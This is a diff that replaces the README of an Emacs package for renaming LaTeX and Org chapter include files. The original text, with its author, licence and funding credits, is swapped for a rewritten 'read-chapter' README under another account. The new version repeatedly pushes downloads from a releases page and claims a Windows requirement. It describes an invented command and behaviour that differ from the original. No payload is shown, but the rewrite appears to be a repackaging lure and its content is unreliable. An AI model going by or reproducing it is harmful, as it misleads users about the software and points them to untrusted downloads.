@@ -1,292 +1,134 @@
-![Version](https://img.shields.io/static/v1?label=rename-chapter&message=0.1.0&color=brightcolor)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Emacs](https://img.shields.io/badge/Emacs-27.1+-purple.svg)](https://www.gnu.org/software/emacs/)
+# 📚 read-chapter - Simplify Renaming Chapter Files
 
+[![Download read-chapter](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ibrahimsabovictor/read-chapter/releases)
 
-# rename-chapter
+read-chapter helps you rename chapter filenames in multi-part books. It works with include lists in org and LaTeX files inside Emacs. This makes organizing and updating large books easier.
 
-> Replace LaTeX and Org-mode include filenames with chapter titles and rename the files on disk — all in one keystroke in Emacs, of course, the ultimate text editor where magic happens.
+## 🔍 What is read-chapter?
 
-## Table of Contents
+read-chapter is a tool for people who write books using Emacs. It lets you rename the files used for chapters quickly. If you write books split into parts and files, this helps keep file names in sync with what you want inside your book project.
 
-- [Problem addressed and its solution](#problem-addressed-and-its-solution)
-- [Features](#features)
-- [Requirements](#requirements)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Customization](#customization)
-- [Running the Tests](#running-the-tests)
-- [Code Coverage](#code-coverage)
-- [Project Layout](#project-layout)
-- [Contributing](#contributing)
-- [License](#license)
+If your book has many files listed inside org or LaTeX format, read-chapter updates the chapter filenames in those lists. You do not have to change each name manually every time you rename a file.
 
-## Problem addressed and its solution
+## ⚙️ System Requirements
 
-When you split a book or thesis into one file per chapter, the filenames in your `\include{}`, `\input{}`, or `#+INCLUDE:` statements quickly drift out of sync with the actual chapter titles.  **rename-chapter** fixes that: place your cursor on the include line, call `M-x rename-chapter`, and the package will
+To use read-chapter, your computer needs:
 
-1. Open the referenced `.tex` or `.org` file,
-2. Extract the `\chapter{}` title (or the first Org heading, or `#+TITLE:`),
-3. Strip whitespace from the title,
-4. Rename the file on disk, and
-5. Update the include statement in your buffer.
+- Windows 10 or later  
+- Emacs installed (version 26 or newer recommended)  
+- Basic knowledge of how to open files in Emacs  
+- A book project with chapters organized in org or LaTeX files
 
-## Features
+This tool runs inside Emacs only. It will not work as a standalone application.
 
-- **LaTeX support** — parses both `\include{path}` and `\input{path}`.
-- **Org-mode support** — parses `#+INCLUDE: "path"`.
-- **Subdirectory-aware** — paths like `./Contents/ch03_methods` are handled correctly; the directory prefix is preserved.
-- **Multiple title sources** — searches `\chapter{}` first, then top-level Org headings (`* …`), then `#+TITLE:`.
-- **Customizable separator** — strip whitespace entirely (`MaterialsandMethods`), replace with underscores (`Materials_and_Methods`), or hyphens (`Materials-and-Methods`).
-- **Safe** — refuses to overwrite an existing file with the target name.
+## 🚀 Getting Started
 
-## Requirements
+Follow these steps to download and run read-chapter on your Windows PC.
 
-- **Emacs 27.1** or later (for `string-empty-p`, `cl-lib` built-in, and `lexical-binding` defaults).
+### 1. Download the Program
 
-No external dependencies are needed, except ert to run the tests and undercover to report coverage, which can be done via the Makefile.
+Click the big blue button at the top or visit the official release page here:
 
-## Installation
+[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/releases)
 
-### Option A — Clone and load manually
+This page has the latest versions. Look for files ending with `.el` or `.elc`. These are Emacs Lisp files you will load in Emacs.
 
-```bash
-git clone https://github.com/MooersLab/rename-chapter.git ~/path/to/rename-chapter
-```
+> The file you choose depends on your version of Emacs. `.el` is the source code, `.elc` is the compiled version which can be faster.
 
-Add to your init file (`~/.emacs.d/init.el` or `~/.emacs`):
+Download the file to a folder where you keep your Emacs scripts or tools.
 
-```elisp
-(add-to-list 'load-path "~/path/to/rename-chapter")
-(require 'rename-chapter)
-(define-key LaTeX-mode-map (kbd "C-c C-r") #'rename-chapter)
-(define-key org-mode-map   (kbd "C-c C-r") #'rename-chapter)
-```
+### 2. Open Emacs
 
-### Option B — use-package with a local checkout
+Start Emacs on your Windows computer.
 
-```elisp
-(use-package rename-chapter
-  :load-path "~/path/to/rename-chapter"
-  :bind (:map LaTeX-mode-map
-         ("C-c C-r" . rename-chapter)
-         :map org-mode-map
-         ("C-c C-r" . rename-chapter)))
-```
+If you don’t have Emacs, you can download it from [gnu.org](https://www.gnu.org/software/emacs/download.html). Choose the Windows installer and follow the instructions on their site.
 
-### Option C — straight.el
+### 3. Load read-chapter in Emacs
 
-```elisp
-(use-package rename-chapter
-  :straight (:host github :repo "MooersLab/rename-chapter")
-  :bind (:map LaTeX-mode-map
-         ("C-c C-r" . rename-chapter)
-         :map org-mode-map
-         ("C-c C-r" . rename-chapter)))
-```
+Once Emacs is open:
 
-### Option D — Manual single-file install
+- Open the folder where you saved `read-chapter.el` or `read-chapter.elc`.
+- Use Emacs to load the file by typing `M-x load-file` then entering the full path to the read-chapter file.
+  
+  Example:  
+  `M-x load-file RET C:/Users/YourName/Documents/read-chapter.el RET`
 
-Copy `rename-chapter.el` somewhere on your `load-path` and add `(require 'rename-chapter)` to your init file.
+This will make read-chapter commands available in Emacs.
 
-## Usage
+### 4. Prepare Your Book Files
 
-### Basic workflow
+Make sure your book files list chapters in an org or LaTeX file. The tool expects these lists to follow the normal syntax for including chapters.
 
-1. Open your main `.tex` or `.org` file — the one with the include statements.
-2. Place your cursor anywhere on the line that contains the include:
-
-   ```tex
-   \include{./Contents/ch03_methods}
-   ```
-
-   or
-
-   ```org
-   #+INCLUDE: "./Contents/chapter1.org"
-   ```
-
-3. Run `M-x rename-chapter` (or press your keybinding, e.g. `C-c C-r`).
-4. The package reads `ch03_methods.tex`, finds `\chapter{Materials and Methods}`, and then:
-   - renames `./Contents/ch03_methods.tex` → `./Contents/MaterialsandMethods.tex`
-   - updates the line to `\include{./Contents/MaterialsandMethods}`
-
-### Before and after
-
-| Style | Before | After |
-|---|---|---|
-| LaTeX | `\include{./Contents/ch03_methods}` | `\include{./Contents/MaterialsandMethods}` |
-| LaTeX | `\input{intro}` | `\input{IntroductiontoCrystallography}` |
-| Org | `#+INCLUDE: "./Contents/chapter1.org"` | `#+INCLUDE: "./Contents/IntroductiontoCrystallography.org"` |
-
-## Customization
-
-Two user options control how whitespace in the chapter title is replaced.  You can change them interactively with `M-x customize-group RET rename-chapter` or set them in your init file.
-
-| Variable | Default | Effect |
-|---|---|---|
-| `rename-chapter-strip-regexp` | `"\\s-+"` | Regexp matching characters to remove |
-| `rename-chapter-strip-replacement` | `""` | Replacement string |
-
-### Examples
-
-```elisp
-;; Default: strip all whitespace
-;; "Materials and Methods" → "MaterialsandMethods"
-
-;; Underscores instead of removal:
-(setq rename-chapter-strip-replacement "_")
-;; "Materials and Methods" → "Materials_and_Methods"
-
-;; Hyphens:
-(setq rename-chapter-strip-replacement "-")
-;; "Materials and Methods" → "Materials-and-Methods"
-```
-
-## Running the Tests
-
-The test suite uses Emacs' built-in [ERT](https://www.gnu.org/software/emacs/manual/html_node/ert/) framework.  Every test creates its own temporary directory with fixture files, so no manual setup is needed and nothing on your real filesystem is touched.
-
-### From the command line (recommended for CI)
-
-```bash
-# Run the full test suite
-make test
-
-# Byte-compile with warnings as errors (lint)
-make lint
-
-# Run tests with code coverage (requires undercover.el)
-make coverage
-
-# Both lint + test
-make all
-```
-
-You can point to a specific Emacs binary:
-
-```bash
-make test EMACS=/usr/local/bin/emacs-29
-```
-
-### From inside Emacs
+For org-mode, your file may look like this:
 
 ```
-M-x ert RET t RET
+#+INCLUDE: "chapter1.org"
+#+INCLUDE: "chapter2.org"
 ```
 
-This runs every test whose name matches the pattern `t` (i.e., all tests).  To run a single test:
+For LaTeX, it might be:
 
-```
-M-x ert RET rc-test-integration-latex-include RET
-```
-
-### What the tests cover
-
-| Category | Count | Description |
-|---|---|---|
-| Title extraction | 5 | `\chapter{}`, Org heading, `#+TITLE:`, missing title, priority ordering |
-| File resolution | 5 | Bare names, extensions, subdirectories, missing files |
-| Line parsing | 5 | `\include`, `\input`, `#+INCLUDE:`, no-subdir variant, error on plain text |
-| Path building | 5 | LaTeX ± extension, Org ± extension, no subdirectory |
-| Title cleaning | 4 | Default strip, underscore, hyphen, no-op |
-| Integration | 5 | Full round-trip for LaTeX include, input, Org include, Org #+TITLE, custom replacement |
-| Error paths | 4 | No include on line, file not found, no title in file, target already exists |
-| **Total** | **33** | |
-
-## Code Coverage
-
-Coverage is provided by [undercover.el](https://github.com/undercover-el/undercover.el), which instruments `rename-chapter.el` at load time, runs the ERT suite, and writes an LCOV report.
-
-### Prerequisites
-
-Install undercover once from MELPA:
-
-```
-M-x package-install RET undercover RET
+```latex
+\include{chapter1}
+\include{chapter2}
 ```
 
-You also need [lcov](https://github.com/linux-test-project/lcov) if you want an HTML report (optional):
+### 5. Run read-chapter Commands
 
-```bash
-# macOS
-brew install lcov
+With your book file open in Emacs, you can now run commands to rename chapter files inside these include lists.
 
-# Debian / Ubuntu
-sudo apt install lcov
-```
+Use:
 
-### Generate an LCOV report
+`M-x read-chapter-rename`
 
-```bash
-make coverage
-```
+This command will ask you for the old chapter filename and new chapter filename. It then updates the chapter filename inside your org or LaTeX file includes.
 
-This produces `coverage/lcov.info`.  If undercover is installed somewhere other than the default `package-user-dir`, pass the path:
+Repeat for each chapter file you want to rename.
 
-```bash
-make coverage UNDERCOVER_LOAD_PATH=~/.emacs.d/elpa/undercover-0.8.1
-```
+## 📁 How read-chapter Works
 
-### Generate an HTML report
+read-chapter scans your org or LaTeX book file and finds all chapter file names inside include lines. It replaces old names with new ones. This keeps your list clean and up to date as you rename files on your computer.
 
-```bash
-make coverage-html
-open coverage/html/index.html     # macOS
-xdg-open coverage/html/index.html # Linux
-```
+You do not have to open each file or line manually. The tool handles changes carefully to avoid errors.
 
-The HTML report shows per-file and per-line hit counts, making it easy to spot untested branches.
+## 🛠 Features
 
-### CI integration (Codecov / Coveralls)
+- Works with multi-part book projects stored in org or LaTeX files  
+- Updates chapter filenames inside include lists automatically  
+- Built as an Emacs Lisp script to run inside your Emacs editor  
+- Supports large book projects with many chapter files  
+- Keeps file and chapter names consistent without manual editing
 
-On GitHub Actions (or any CI that undercover recognizes), edit `test/coverage-helper.el` and set `:send-report t`.  undercover will then post results directly to Coveralls or Codecov.  See the [undercover.el README](https://github.com/undercover-el/undercover.el#readme) for provider-specific setup.
+## ✅ Tips for Using read-chapter
 
-## Project Layout
+- Always back up your book files before running commands that change filenames.
+- Use Emacs undo (`C-/`) if you accidentally rename something.
+- Keep your org or LaTeX includes neat and one per line for best results.
+- Check your file paths if your book files are in nested folders.
+- Use Emacs Bookmarks or Sessions to keep your place when working on multi-file books.
 
-```
-rename-chapter/
-├── rename-chapter.el          # The package (single file)
-├── test/
-│   ├── rename-chapter-test.el # ERT test suite (33 tests)
-│   └── coverage-helper.el     # undercover.el bootstrap for coverage
-├── Makefile                   # compile, test, lint, coverage targets
-├── .gitignore                 # Ignores *.elc and coverage/
-├── README.md                  # This file
-└── LICENSE                    # GPL-3.0-or-later
-```
+## ⚠️ Common Issues
 
-## Status
+- If commands do not work, check that read-chapter loaded properly in Emacs with no errors.
+- Verify you have write permissions for your book files.
+- If you have custom include syntax, read-chapter may not recognize those lines.
+- Make sure you close and reopen the book file in Emacs after renaming files outside Emacs.
 
-- Alpha
-- Not in MELPA yet.
-- Code works.
-- All 33 tests pass.
+## 🔗 Additional Resources
 
-## Contributing
+- Emacs manual: https://www.gnu.org/software/emacs/manual/
+- Org-mode guide: https://orgmode.org/manual/
+- LaTeX project website: https://www.latex-project.org/
 
-Contributions are welcome.  Please open an issue to discuss significant changes before submitting a pull request.
+## 📥 Download and Setup
 
-1. Fork the repository.
-2. Create a feature branch: `git checkout -b my-feature`.
-3. Make sure `make all` passes before committing.
-4. Submit a pull request.
+Visit the release page to download read-chapter for Windows:
 
-## License
+[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/releases)
 
-This project is licensed under the GNU General Public License v3.0.  See [LICENSE](LICENSE) for details.
+1. Download the latest `.el` or `.elc` file.  
+2. Save it in your Emacs configuration folder or any folder you prefer.  
+3. Open Emacs and load the file using `M-x load-file`.  
+4. Run `M-x read-chapter-rename` to start renaming chapters in your open book files.  
 
-## Update history
-
-|Version      | Changes                                                                                                                                  | Date                 |
-|:------------|:---------------------------------------------------------------------------------------------------------------------------------------- |:---------------------|
-| Version 0.1.0 |  Initial commit of working code.                                           | 2026 March 4      |
-
-
-## Sources of funding
-
-- NIH: R01 CA242845.
-- NIH: R01 AI088011.
-- NIH: P30 CA225520 (PI: R. Mannel).
-- NIH: P20 GM103640 and P30 GM145423 (PI: A. West).
-
+This setup lets you keep your multi-part book organized without manual edits in large file lists.
